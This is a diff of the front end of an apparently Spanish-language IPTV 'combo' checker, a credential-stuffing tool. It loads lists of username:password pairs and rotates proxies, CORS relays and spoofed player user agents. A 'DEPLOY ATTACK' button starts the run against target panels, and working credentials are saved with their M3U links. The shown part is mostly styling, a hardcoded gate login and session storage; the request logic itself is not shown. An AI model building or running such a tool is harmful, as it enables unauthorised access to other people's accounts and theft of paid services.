@@ -3,742 +3,709 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; connect-src * http://* https://*; img-src * data:;">
-    <meta name="theme-color" content="#050508">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>☢️ ALEXTEAMVENENO</title>
+    <title>☢️ ALEXTEAMVENENO · DRAGÓN APK</title>
     <style>
         :root {
-            --bg: #050508; --card: #0a0a15; --border: #1a1a2e;
-            --purple: #a855f7; --green: #10b981; --red: #ef4444;
-            --cyan: #06b6d4; --orange: #f59e0b; --text: #e2e8f0; --muted: #94a3b8;
-            --touch: 48px;
+            --neon-magenta: #ff00ff;
+            --neon-cyan: #00ffff;
+            --neon-green: #00ff41;
+            --neon-yellow: #ffe600;
+            --neon-orange: #ff6a00;
+            --neon-red: #ff0040;
+            --neon-purple: #b300ff;
+            --dragon-fire: #ff4500;
+            --bg-deep: #050508;
+            --text-dim: #7a7a9a;
+            --text-body: #c0c0e0;
         }
-        * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
+
+        * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color: transparent; }
+
         body {
-            background: var(--bg); color: var(--text);
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            min-height: 100vh; min-height: -webkit-fill-available;
-            overflow-x: hidden; font-size: 14px; line-height: 1.4;
-            -webkit-user-select: none; user-select: none;
+            background: var(--bg-deep);
+            background-image: linear-gradient(rgba(255,0,255,0.02) 1px, transparent 1px), linear-gradient(90deg, rgba(255,0,255,0.02) 1px, transparent 1px);
+            background-size: 40px 40px, 40px 40px;
+            color: var(--text-body);
+            font-family: 'Courier New', 'Consolas', monospace;
+            min-height: 100vh;
         }
+
+        body::before { content: ''; position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.7); pointer-events: none; z-index:0; }
+
+        .content-wrapper { position: relative; z-index: 1; display: none; padding: 12px 10px 80px 10px; }
+
+        /* LOGIN */
         #loginScreen {
-            position: fixed; inset: 0; z-index: 100; display: flex;
-            align-items: center; justify-content: center;
-            background: rgba(0,0,0,0.9); padding: 20px;
+            position: fixed;
+            top:0; left:0;
+            width:100%; height:100%;
+            z-index: 100;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0,0,0,0.96);
+            backdrop-filter: blur(10px);
+            padding: 20px;
         }
+
         .login-box {
-            background: var(--card); border: 1px solid var(--border); border-radius: 16px;
-            padding: 30px 24px; width: 100%; max-width: 380px; text-align: center;
+            background: rgba(10,5,20,0.97);
+            border: 2px solid var(--neon-magenta);
+            border-radius: 28px;
+            padding: 30px 22px;
+            width: 100%;
+            max-width: 360px;
+            box-shadow: 0 0 35px rgba(255,0,255,0.4);
         }
-        .login-logo { font-size: 3em; margin-bottom: 8px; }
-        .login-brand { font-size: 1.3em; font-weight: 900; color: var(--purple); letter-spacing: 2px; margin-bottom: 20px; }
-        .login-input {
-            width: 100%; background: #0f0f1e; border: 1px solid var(--border); border-radius: 12px;
-            padding: 14px 16px; color: #fff; font-size: 1em; margin-bottom: 12px; outline: none;
-            min-height: var(--touch);
-        }
-        .login-input:focus { border-color: var(--purple); }
-        .login-btn {
-            width: 100%; background: var(--purple); color: #fff; border: none;
-            border-radius: 12px; padding: 14px; font-size: 1em; font-weight: 700;
-            cursor: pointer; min-height: var(--touch); letter-spacing: 1px;
-        }
-        .login-btn:active { opacity: 0.8; transform: scale(0.98); }
-        .login-error { color: var(--red); font-size: 0.85em; margin-top: 8px; display: none; }
 
-        #welcomeScreen {
-            position: fixed; inset: 0; z-index: 99; display: none;
-            align-items: center; justify-content: center; flex-direction: column;
-            background: rgba(0,0,0,0.95); padding: 20px;
-        }
-        .welcome-emoji { font-size: 5em; animation: pulse 1s infinite; }
-        @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.1)} }
-        .welcome-text { font-size: 1.4em; font-weight: 900; color: var(--purple); margin: 10px 0; }
-        .welcome-sub { color: var(--muted); font-size: 0.9em; }
-        .welcome-bar { width: 200px; height: 4px; background: #1a1a2e; border-radius: 2px; margin: 15px 0; overflow: hidden; }
-        .welcome-bar-fill { height: 100%; background: var(--purple); width: 0%; animation: fillBar 2.5s forwards; }
-        @keyframes fillBar { to { width: 100%; } }
+        .login-logo { text-align: center; font-size: 3.5em; margin-bottom: 8px; animation: pulse 1.5s ease infinite; }
+        @keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.08); } }
 
-        #dashboard { display: none; padding: 8px; padding-bottom: 100px; max-width: 700px; margin: 0 auto; }
-        .header {
-            display: flex; align-items: center; gap: 10px; padding: 10px 12px;
-            background: var(--card); border: 1px solid var(--border); border-radius: 12px;
-            margin-bottom: 8px; position: sticky; top: 8px; z-index: 50;
-        }
-        .header-logo { font-size: 1.5em; }
-        .header-title { font-weight: 900; color: var(--purple); font-size: 0.95em; flex: 1; }
-        .header-btn {
-            background: transparent; border: 1px solid var(--border); color: var(--muted);
-            padding: 8px 12px; border-radius: 8px; font-size: 0.8em; cursor: pointer; min-height: 36px;
-        }
-        .section {
-            background: var(--card); border: 1px solid var(--border); border-radius: 12px;
-            padding: 12px; margin-bottom: 8px;
-        }
-        .section-title {
-            font-size: 0.7em; font-weight: 700; color: var(--muted);
-            letter-spacing: 1px; margin-bottom: 8px; text-transform: uppercase;
-        }
-        .row { display: flex; gap: 6px; align-items: center; flex-wrap: wrap; }
-        .input {
-            flex: 1; background: #0f0f1e; border: 1px solid var(--border); border-radius: 10px;
-            padding: 12px; color: #fff; font-size: 0.9em; outline: none; min-height: 44px;
-            min-width: 120px;
-        }
-        .input:focus { border-color: var(--purple); }
-        select {
-            background: #0f0f1e; border: 1px solid var(--border); border-radius: 10px;
-            padding: 10px 12px; color: #fff; font-size: 0.85em; outline: none; min-height: 44px;
-        }
-        select:focus { border-color: var(--purple); }
-        .btn {
-            background: var(--purple); color: #fff; border: none; border-radius: 10px;
-            padding: 12px 14px; font-weight: 700; cursor: pointer; font-size: 0.85em;
-            min-height: 44px; white-space: nowrap; letter-spacing: 0.5px;
-            display: inline-flex; align-items: center; gap: 4px; justify-content: center;
-        }
-        .btn:active { opacity: 0.8; transform: scale(0.97); }
-        .btn-block { width: 100%; }
-        .btn-green { background: var(--green); }
-        .btn-red { background: var(--red); }
-        .btn-cyan { background: transparent; border: 1px solid var(--cyan); color: var(--cyan); }
-        .btn-outline { background: transparent; border: 1px solid var(--border); color: var(--text); }
-        .btn-sm { padding: 8px 12px; font-size: 0.75em; min-height: 36px; }
+        .login-brand { text-align: center; font-size: 1.2em; font-weight: 900; letter-spacing: 3px; background: linear-gradient(90deg, #ff00ff, #00ffff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
 
-        .stats-row { display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; margin-bottom: 6px; }
-        .stat { background: #0f0f1e; border-radius: 10px; padding: 10px 6px; text-align: center; }
-        .stat-val { font-size: 1.3em; font-weight: 900; }
-        .stat-val.green { color: var(--green); }
-        .stat-val.red { color: var(--red); }
-        .stat-val.cyan { color: var(--cyan); }
-        .stat-lbl { font-size: 0.6em; color: var(--muted); text-transform: uppercase; }
-        .progress-bar { height: 6px; background: #1a1a2e; border-radius: 3px; margin: 8px 0; }
-        .progress-fill { height: 100%; background: var(--purple); border-radius: 3px; width: 0%; transition: width 0.3s; }
-        .progress-text { font-size: 0.65em; color: var(--muted); text-align: center; }
+        .input-group { margin-bottom: 18px; }
+        .input-group label { font-size: 0.7em; color: #00ffff; letter-spacing: 2px; display: block; margin-bottom: 6px; }
+        .input-group input {
+            width: 100%;
+            background: #0a0a18;
+            border: 1px solid rgba(0,255,255,0.3);
+            border-radius: 14px;
+            padding: 12px 14px;
+            color: white;
+            font-family: monospace;
+            font-size: 0.9em;
+        }
+        .input-group input:focus { border-color: #ff00ff; outline: none; }
+
+        .btn-login {
+            width: 100%;
+            background: linear-gradient(135deg, #b80040, #ff0040);
+            border: none;
+            border-radius: 40px;
+            padding: 14px;
+            color: white;
+            font-weight: bold;
+            letter-spacing: 2px;
+            font-size: 1em;
+            margin-top: 10px;
+            cursor: pointer;
+            box-shadow: 0 0 15px #ff0040;
+        }
+
+        .login-error { text-align: center; color: #ff0040; font-size: 0.7em; margin-top: 12px; display: none; }
+
+        /* DASHBOARD */
+        .banner {
+            background: linear-gradient(135deg, #0a0514, #150523);
+            border: 1px solid #ff00ff;
+            border-radius: 20px;
+            padding: 12px;
+            text-align: center;
+            font-weight: bold;
+            margin-bottom: 12px;
+        }
+
+        .main-container { display: flex; flex-direction: column; gap: 12px; }
+
+        .card {
+            background: rgba(13,13,26,0.9);
+            border: 1px solid rgba(0,255,255,0.2);
+            border-radius: 18px;
+            padding: 14px;
+        }
+
+        .card-title {
+            font-size: 0.75em;
+            font-weight: bold;
+            letter-spacing: 2px;
+            margin-bottom: 10px;
+            color: #ff00ff;
+            border-left: 3px solid #ff00ff;
+            padding-left: 10px;
+        }
+
+        .row { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
+        .col { flex: 1; min-width: 0; }
+
+        input, select, button {
+            background: #0f0f1e;
+            border: 1px solid #ff00ff40;
+            border-radius: 14px;
+            padding: 10px 12px;
+            color: #00ffff;
+            font-family: monospace;
+            font-size: 0.8em;
+        }
+
+        button {
+            background: linear-gradient(135deg, #1a0a2a, #0f0f1e);
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.2s;
+        }
+        button:active { transform: scale(0.96); }
+
+        .btn-start {
+            background: linear-gradient(135deg, #b80040, #ff0040);
+            color: white;
+            border: none;
+            flex: 2;
+            font-size: 1em;
+            padding: 14px;
+        }
+        .btn-stop { background: #5a0050; flex: 1; }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 8px;
+            margin-bottom: 10px;
+        }
+        .stat-box {
+            background: #0a0a18;
+            border-radius: 14px;
+            padding: 8px 4px;
+            text-align: center;
+            font-size: 0.6em;
+        }
+        .stat-value { font-size: 1.4em; font-weight: bold; display: block; }
+        .stat-hits .stat-value { color: #00ff41; text-shadow: 0 0 6px #00ff41; }
+
+        .progress-bar {
+            height: 12px;
+            background: #1a1a2a;
+            border-radius: 20px;
+            overflow: hidden;
+            margin: 8px 0;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #b300ff, #ff00ff, #ff6a00);
+            width: 0%;
+            transition: width 0.2s;
+        }
 
         .console {
-            background: #000; border: 1px solid var(--border); border-radius: 10px;
-            padding: 10px; max-height: 100px; overflow-y: auto; font-family: monospace;
-            font-size: 0.68em; color: var(--green); line-height: 1.5; margin-top: 6px;
+            background: #05050f;
+            border-radius: 14px;
+            padding: 10px;
+            font-size: 0.65em;
+            height: 120px;
+            overflow-y: auto;
+            color: #00ff41;
+            font-family: monospace;
         }
-        .console .h { color: var(--green); font-weight: bold; }
-        .console .e { color: var(--red); }
-        .console .i { color: #7a7aaa; }
 
-        .hit-card {
-            background: #0f0f1e; border: 1px solid var(--border); border-radius: 10px;
-            padding: 10px 12px; margin-bottom: 6px; cursor: pointer; transition: all 0.15s;
-            position: relative;
+        .table-container {
+            overflow-x: auto;
+            border-radius: 16px;
+            background: #0a0a18;
+            margin-top: 8px;
         }
-        .hit-card:active { background: #1a1a30; border-color: var(--purple); }
-        .hit-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 2px; }
-        .hit-user { font-weight: 700; color: #fff; font-size: 0.95em; }
-        .hit-pass { color: var(--green); font-size: 0.85em; }
-        .hit-panel { color: var(--cyan); font-size: 0.7em; }
-        .hit-info { display: flex; gap: 8px; margin-top: 4px; font-size: 0.7em; color: var(--muted); flex-wrap: wrap; }
-        .hit-info span { color: var(--orange); }
-        .hit-actions { display: flex; gap: 4px; margin-top: 6px; }
-        .hit-copy-btn {
-            background: rgba(168,85,247,0.2); color: var(--purple); border: 1px solid rgba(168,85,247,0.3);
-            border-radius: 6px; padding: 6px 10px; font-size: 0.68em; font-weight: 700;
-            cursor: pointer; min-height: 32px;
+        .hits-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.7em;
+            min-width: 700px;
         }
-        .hit-copy-btn:active { background: rgba(168,85,247,0.4); }
+        .hits-table th {
+            background: #150a25;
+            color: #ff00ff;
+            padding: 8px 5px;
+            position: sticky;
+            top: 0;
+        }
+        .hits-table td {
+            padding: 8px 5px;
+            border-bottom: 1px solid #ff00ff20;
+        }
+        .hits-table tr:active { background: #ff00ff20; }
+
+        .m3u-cell { display: flex; gap: 6px; align-items: center; }
+        .m3u-link-text {
+            max-width: 120px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            color: #00ffff;
+            text-decoration: underline;
+        }
+        .btn-copy-m3u { padding: 4px 8px; font-size: 0.7em; }
 
         .modal-overlay {
-            position: fixed; inset: 0; z-index: 200; background: rgba(0,0,0,0.9);
-            display: none; align-items: flex-end; justify-content: center;
+            position: fixed;
+            top:0; left:0;
+            width:100%; height:100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 1000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 15px;
         }
-        .modal-overlay.show { display: flex; }
-        .modal-content {
-            background: var(--card); border: 1px solid var(--border); border-radius: 16px 16px 0 0;
-            padding: 20px 16px; width: 100%; max-height: 70vh; overflow-y: auto;
+        .modal {
+            background: #0f0f1f;
+            border: 2px solid #ff00ff;
+            border-radius: 28px;
+            max-width: 500px;
+            width: 100%;
+            max-height: 85vh;
+            overflow-y: auto;
+            padding: 20px;
         }
-        .modal-handle { width: 40px; height: 4px; background: var(--border); border-radius: 2px; margin: 0 auto 15px; }
-        .modal-title { font-weight: 900; margin-bottom: 10px; color: var(--purple); font-size: 1em; }
-        .cat-tag {
-            display: inline-block; background: rgba(168,85,247,0.15); color: var(--purple);
-            border-radius: 15px; padding: 5px 10px; margin: 2px; font-size: 0.75em;
+        .m3u-link-full {
+            background: #050510;
+            border-radius: 16px;
+            padding: 12px;
+            word-break: break-all;
+            color: #00ffff;
+            margin: 12px 0;
         }
-        .modal-close {
-            width: 100%; background: var(--red); color: #fff; border: none;
-            border-radius: 10px; padding: 14px; font-weight: 700; cursor: pointer;
-            margin-top: 12px; min-height: 44px;
-        }
-
         .toast {
-            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
-            background: var(--green); color: #000; padding: 10px 20px; border-radius: 25px;
-            font-weight: 700; font-size: 0.85em; z-index: 300; transition: all 0.3s;
-            opacity: 0; pointer-events: none; white-space: nowrap;
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            background: #1a0a2a;
+            border: 1px solid #ff00ff;
+            border-radius: 40px;
+            padding: 12px;
+            text-align: center;
+            z-index: 1100;
+            display: none;
+            font-size: 0.8em;
+            backdrop-filter: blur(10px);
         }
-        .toast.show { opacity: 1; }
-        .toast.err { background: var(--red); color: #fff; }
-
-        .empty { text-align: center; color: var(--muted); padding: 30px 20px; font-size: 0.85em; }
-
-        .checkbox-inline { display: flex; gap: 12px; flex-wrap: wrap; font-size: 0.75em; color: var(--muted); }
-        .checkbox-inline label { display: flex; align-items: center; gap: 4px; cursor: pointer; }
-        .checkbox-inline input { accent-color: var(--purple); width: 16px; height: 16px; }
-
-        @media (min-width: 600px) {
-            #dashboard { padding: 12px; padding-bottom: 100px; }
-            .stats-row { grid-template-columns: repeat(4, 1fr); }
+        .footer-actions {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: #050510dd;
+            backdrop-filter: blur(10px);
+            display: flex;
+            gap: 8px;
+            padding: 8px 12px;
+            z-index: 50;
+            border-top: 1px solid #ff00ff;
+        }
+        .footer-actions button { flex: 1; font-size: 0.7em; border-radius: 40px; }
+        .lang-indicator {
+            position: fixed;
+            top: 12px;
+            right: 12px;
+            background: #000000aa;
+            border-radius: 40px;
+            padding: 5px 12px;
+            font-size: 1.2em;
+            z-index: 60;
+            backdrop-filter: blur(4px);
+        }
+        @media (max-width: 500px) {
+            .stats-grid { grid-template-columns: repeat(2, 1fr); }
+            .card-title { font-size: 0.7em; }
         }
     </style>
 </head>
 <body>
 
-    <!-- LOGIN -->
-    <div id="loginScreen">
-        <div class="login-box">
-            <div class="login-logo">☢️</div>
-            <div class="login-brand">ALEXTEAMVENENO</div>
-            <input class="login-input" type="text" id="loginUser" placeholder="Usuario" autocomplete="off">
-            <input class="login-input" type="password" id="loginPass" placeholder="Contraseña">
-            <button class="login-btn" onclick="doLogin()">🚀 ACCEDER</button>
-            <div class="login-error" id="loginError">⚠️ Credenciales incorrectas</div>
-        </div>
+<div id="loginScreen">
+    <div class="login-box">
+        <div class="login-logo">🐉☢️</div>
+        <div class="login-brand">ALEXTEAMVENENO</div>
+        <div class="input-group"><label>👤 USUARIO</label><input type="text" id="loginUser" placeholder="ALEX"></div>
+        <div class="input-group"><label>🔑 CONTRASEÑA</label><input type="password" id="loginPass" placeholder="IPTV92"></div>
+        <button class="btn-login" onclick="doLogin()">🚀 ACCEDER</button>
+        <div class="login-error" id="loginError">⚠️ Credenciales incorrectas</div>
     </div>
+</div>
 
-    <!-- BIENVENIDA -->
-    <div id="welcomeScreen">
-        <div class="welcome-emoji">🐉</div>
-        <div class="welcome-text">EL DRAGÓN DESPIERTA</div>
-        <div class="welcome-sub">ALEXTEAMVENENO</div>
-        <div class="welcome-bar"><div class="welcome-bar-fill"></div></div>
-    </div>
-
-    <!-- DASHBOARD -->
-    <div id="dashboard">
-        <div class="header">
-            <span class="header-logo">☢️</span>
-            <span class="header-title">ALEXTEAMVENENO</span>
-            <button class="header-btn" onclick="doLogout()" title="Salir">🚪</button>
-        </div>
-
-        <!-- CONFIG -->
-        <div class="section">
-            <div class="section-title">⚙️ CONFIGURACIÓN</div>
-            <label style="font-size:0.7em;color:var(--muted);">🌐 URL DEL PANEL</label>
-            <input class="input" type="text" id="portals" placeholder="panel.com:80" style="margin-bottom:6px;">
+<div class="content-wrapper" id="dashboard">
+    <div class="banner">☢️ TEAM VENENO · ALEX92 · DRAGÓN APK ☢️</div>
+    <div class="main-container">
+        <div class="card">
+            <div class="card-title">📁 COMBO LOADER</div>
             <div class="row">
-                <input class="input" type="number" id="threads" value="20" min="1" max="50" placeholder="Threads" style="max-width:80px;">
-                <select id="proxyType" style="flex:1;">
-                    <option value="0">SOCKS5h</option>
-                    <option value="1">HTTP</option>
-                    <option value="2">SOCKS4</option>
-                    <option value="3">SOCKS5</option>
-                </select>
-            </div>
-            <div class="checkbox-inline" style="margin-top:6px;">
-                <label><input type="checkbox" id="useHttps"> SSL</label>
-                <label><input type="checkbox" id="useProxies"> PROXY</label>
-                <label><input type="checkbox" id="logInfo" checked> INFO</label>
-                <label><input type="checkbox" id="logHits" checked> HITS</label>
-                <label><input type="checkbox" id="logErrors" checked> ERR</label>
+                <input type="file" id="comboFile" accept=".txt" style="display:none;" onchange="handleComboFile(event)">
+                <button onclick="document.getElementById('comboFile').click()" style="flex:2">📂 CARGAR COMBO</button>
+                <span id="comboStatus" style="font-size:0.7em;">0 cuentas</span>
             </div>
         </div>
 
-        <!-- BOTONES ACCIÓN -->
-        <div class="row" style="margin-bottom:8px;">
-            <button class="btn btn-block" onclick="document.getElementById('comboFile').click()">📂 CARGAR COMBO</button>
-            <input type="file" id="comboFile" accept=".txt" style="display:none;" onchange="handleComboFile(event)">
-            <button class="btn btn-outline btn-sm" onclick="document.getElementById('proxyFile').click()">🔄 PROXY</button>
-            <input type="file" id="proxyFile" accept=".txt" style="display:none;" onchange="handleProxyFile(event)">
-            <button class="btn btn-cyan btn-sm" onclick="scrapeProxies()" id="btnScrape">🌐 SCRAPE</button>
-        </div>
-        <span id="comboStatus" style="font-size:0.65em;color:var(--cyan);">0 combos</span> |
-        <span id="proxyStatus" style="font-size:0.65em;color:var(--cyan);">0 proxies</span>
-
-        <!-- STATS -->
-        <div class="section" style="margin-top:8px;">
-            <div class="stats-row">
-                <div class="stat"><div class="stat-val cyan" id="statChecked">0</div><div class="stat-lbl">SCANNED</div></div>
-                <div class="stat"><div class="stat-val green" id="statHits">0</div><div class="stat-lbl">HITS</div></div>
-                <div class="stat"><div class="stat-val red" id="statErrors">0</div><div class="stat-lbl">ERRORS</div></div>
+        <div class="card">
+            <div class="card-title">🌐 PROXY MATRIX</div>
+            <select id="proxyType" style="width:100%; margin-bottom:8px;">
+                <option value="0">AUTO → SOCKS5h</option><option value="1">HTTP Force</option><option value="2">SOCKS4</option><option value="3">SOCKS5</option>
+            </select>
+            <div class="row">
+                <input type="file" id="proxyFile" accept=".txt" style="display:none;" onchange="handleProxyFile(event)">
+                <button onclick="document.getElementById('proxyFile').click()">🔄 CARGAR PROXY</button>
+                <button onclick="scrapeProxies()" id="btnScrape">🌐 SCRAPEAR</button>
             </div>
-            <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
-            <div class="progress-text" id="progressText">[ 0 / 0 ] 0%</div>
+            <span id="proxyStatus" style="font-size:0.7em;">0 proxies</span>
         </div>
 
-        <!-- CONTROLES -->
-        <div class="row" style="margin-bottom:8px;">
-            <button class="btn btn-green btn-block" id="btnStart" onclick="startScan()">🚀 DEPLOY ATTACK</button>
-            <button class="btn btn-red btn-block" id="btnStop" onclick="stopScan()" disabled>⬛ STOP</button>
-        </div>
-
-        <!-- CONSOLA -->
-        <div class="console" id="console">> ALEXTEAMVENENO v17 · Listo</div>
-
-        <!-- HITS -->
-        <div class="section">
-            <div class="section-title">⭐ HITS ENCONTRADOS <span id="hitCount" style="color:var(--green);">0</span></div>
-            <div id="hitsContainer">
-                <div class="empty">👆 Carga un combo y despliega el ataque</div>
+        <div class="card">
+            <div class="card-title">⚙️ CONFIGURACIÓN</div>
+            <input type="text" id="portals" placeholder="tudominio.com:80, otropanel.com" style="width:100%; margin-bottom:8px;">
+            <div class="row">
+                <div class="col"><label>🔢 HILOS</label><input type="number" id="threads" value="20" min="1" max="80"></div>
+                <label style="display:flex; align-items:center; gap:6px;"><input type="checkbox" id="useHttps"> 🔒 SSL</label>
+                <label style="display:flex; align-items:center; gap:6px;"><input type="checkbox" id="useProxies" checked> 🌐 PROXY</label>
             </div>
-            <button class="btn btn-outline btn-block btn-sm" onclick="downloadAllFiles()" style="margin-top:8px;" id="btnDownloadAll" disabled>📥 DESCARGAR TODOS LOS HITS</button>
+        </div>
+
+        <div class="stats-grid">
+            <div class="stat-box">🔍 SCANNED<span class="stat-value" id="statChecked">0</span></div>
+            <div class="stat-box stat-hits">✅ HITS<span class="stat-value" id="statHits">0</span></div>
+            <div class="stat-box">❌ ERR<span class="stat-value" id="statErrors">0</span></div>
+            <div class="stat-box">🎯 RATE<span class="stat-value" id="statRate">0%</span></div>
+            <div class="stat-box">📺 CANALES<span class="stat-value" id="statChannels">0</span></div>
+            <div class="stat-box">🇪🇸 ESPAÑA<span class="stat-value" id="statSpain">0</span></div>
+            <div class="stat-box">⏳ ETA<span class="stat-value" id="statETA">00:00</span></div>
+            <div class="stat-box">📈 CPM<span class="stat-value" id="statCPM">0</span></div>
+        </div>
+        <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+
+        <div class="card" style="padding:8px;">
+            <div class="card-title">📟 CONSOLA</div>
+            <div class="console" id="console">> ALEXTEAMVENENO APK v2.0<br>> Inicia sesión para comenzar</div>
+        </div>
+
+        <div class="card">
+            <div class="card-title">⭐ HIT DATABASE (AUTO-SAVE)</div>
+            <div class="table-container">
+                <table class="hits-table" id="hitsTable">
+                    <thead><tr><th>USER</th><th>PASS</th><th>PANEL</th><th>📺</th><th>🇪🇸</th><th>M3U</th></tr></thead>
+                    <tbody id="hitsBody"></tbody>
+                </table>
+            </div>
+        </div>
+
+        <div class="row" style="margin-top:6px; gap:12px;">
+            <button class="btn-start" id="btnStart" onclick="startScan()">🚀 INICIAR ATAQUE</button>
+            <button class="btn-stop" id="btnStop" onclick="stopScan()" disabled>⬛ DETENER</button>
         </div>
     </div>
+</div>
 
-    <!-- MODAL CATEGORÍAS -->
-    <div class="modal-overlay" id="modalCats" onclick="closeModal()">
-        <div class="modal-content" onclick="event.stopPropagation()">
-            <div class="modal-handle"></div>
-            <div class="modal-title">📂 DETALLES DEL HIT</div>
-            <div id="modalContent"></div>
-            <button class="modal-close" onclick="closeModal()">❌ CERRAR</button>
+<div class="footer-actions">
+    <button onclick="saveHitsToTxt()">💾 GUARDAR HITS</button>
+    <button onclick="clearHits()">🗑️ LIMPIAR</button>
+    <button onclick="doLogout()">🚪 SALIR</button>
+</div>
+<div class="lang-indicator" id="langIndicator" onclick="toggleLang()">🇪🇸</div>
+
+<div class="modal-overlay" id="m3uModal" onclick="closeModal(event)">
+    <div class="modal" onclick="event.stopPropagation()">
+        <div style="font-size:1.2em; margin-bottom:12px;">☢️ DETALLES DEL HIT</div>
+        <div id="modalHitInfo" style="background:#050510; border-radius:16px; padding:12px; margin-bottom:12px;"></div>
+        <div class="m3u-link-full" id="m3uModalLink" onclick="copyM3uFromModal()"></div>
+        <div class="row" style="margin-top:12px;">
+            <button onclick="copyM3uFromModal()" style="flex:1">📋 COPIAR M3U</button>
+            <button onclick="copyAllDetails()" style="flex:1">📄 COPIAR TODO</button>
+            <button onclick="closeModal()">❌ CERRAR</button>
         </div>
     </div>
+</div>
+<div class="toast" id="toast"></div>
 
-    <div class="toast" id="toast"></div>
+<script>
+    // ========== CREDENCIALES FIJAS ==========
+    const VALID_USER = 'ALEX';
+    const VALID_PASS = 'IPTV92';
+    let isLoggedIn = false;
+    let currentLang = 'es';
 
-    <script>
-        // ==================== CONFIG ====================
-        const VALID_USER = 'ALEX';
-        const VALID_PASS = 'IPTV92';
-        let isLoggedIn = false;
+    // ESTADO GLOBAL
+    let comboLines = [];
+    let proxies = [];
+    let hitsArray = [];
+    let isRunning = false;
+    let stats = { checked: 0, hits: 0, errors: 0 };
+    let startTime = 0;
+    let totalCombos = 0;
+    let proxyIndex = 0;
+    let totalChannels = 0, totalSpain = 0;
 
-        const CORS_PROXIES = [
-            'https://api.allorigins.win/raw?url=',
-            'https://corsproxy.io/?',
-            'https://thingproxy.freeboard.io/fetch/'
-        ];
-        let currentProxyIndex = 0;
-        function getNextCorsProxy() { return CORS_PROXIES[currentProxyIndex++ % CORS_PROXIES.length]; }
-
-        const state = {
-            comboLines: [], proxies: [], hits: [], isRunning: false,
-            stats: { checked: 0, hits: 0, errors: 0 }, startTime: 0,
-            totalCombos: 0, proxyIndex: 0, totalChannels: 0, totalSpain: 0
-        };
-
-        const USER_AGENTS = [
-            "VLC/3.0.20","ExoPlayerDemo/2.19.1","Kodi/20.2",
-            "Mozilla/5.0 (Linux; Android 14)","Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0.0.0"
-        ];
-        function getRandomUA() { return USER_AGENTS[Math.floor(Math.random()*USER_AGENTS.length)]; }
-
-        // ==================== LOGIN ====================
-        function doLogin() {
-            if (document.getElementById('loginUser').value.trim() === VALID_USER && 
-                document.getElementById('loginPass').value === VALID_PASS) {
-                isLoggedIn = true;
-                document.getElementById('loginScreen').style.display = 'none';
-                document.getElementById('welcomeScreen').style.display = 'flex';
-                setTimeout(() => {
-                    document.getElementById('welcomeScreen').style.display = 'none';
-                    document.getElementById('dashboard').style.display = 'block';
-                    loadState();
-                    loadExistingFiles();
-                }, 2500);
-            } else {
-                document.getElementById('loginError').style.display = 'block';
-                document.getElementById('loginPass').value = '';
-            }
-        }
-
-        function doLogout() {
-            saveState();
-            isLoggedIn = false;
-            if (state.isRunning) stopScan();
-            document.getElementById('dashboard').style.display = 'none';
-            document.getElementById('loginScreen').style.display = 'flex';
-            document.getElementById('loginUser').value = '';
-            document.getElementById('loginPass').value = '';
-            document.getElementById('loginError').style.display = 'none';
-        }
-
-        document.addEventListener('keydown', e => { if (!isLoggedIn && e.key === 'Enter') doLogin(); });
-
-        // ==================== AUTO-SAVE ====================
-        function saveState() {
-            if (!isLoggedIn) return;
-            try {
-                localStorage.setItem('alexState', JSON.stringify({
-                    comboLines: state.comboLines.slice(0, 10000),
-                    proxies: state.proxies.slice(0, 1000),
-                    hits: state.hits.slice(-500),
-                    totalCombos: state.totalCombos,
-                    portals: document.getElementById('portals').value,
-                    threads: document.getElementById('threads').value,
-                    useHttps: document.getElementById('useHttps').checked,
-                    useProxies: document.getElementById('useProxies').checked,
-                }));
-            } catch(e) {}
-        }
-
-        function loadState() {
-            try {
-                const d = JSON.parse(localStorage.getItem('alexState'));
-                if (!d) return;
-                if (d.comboLines) { state.comboLines = d.comboLines; state.totalCombos = d.totalCombos || d.comboLines.length; }
-                if (d.proxies) state.proxies = d.proxies;
-                if (d.portals) document.getElementById('portals').value = d.portals;
-                if (d.threads) document.getElementById('threads').value = d.threads;
-                if (d.useHttps !== undefined) document.getElementById('useHttps').checked = d.useHttps;
-                if (d.useProxies !== undefined) document.getElementById('useProxies').checked = d.useProxies;
-                document.getElementById('comboStatus').textContent = `${state.totalCombos} combos`;
-                document.getElementById('proxyStatus').textContent = `${state.proxies.length} proxies`;
-                if (d.hits && d.hits.length > 0) {
-                    state.hits = [];
-                    document.getElementById('hitsContainer').innerHTML = '';
-                    d.hits.forEach(h => renderHitCard(h));
-                }
-                updateStats();
-                log('💾 Sesión restaurada', 'i');
-            } catch(e) {}
-        }
-
-        window.addEventListener('beforeunload', () => { if (isLoggedIn) saveState(); });
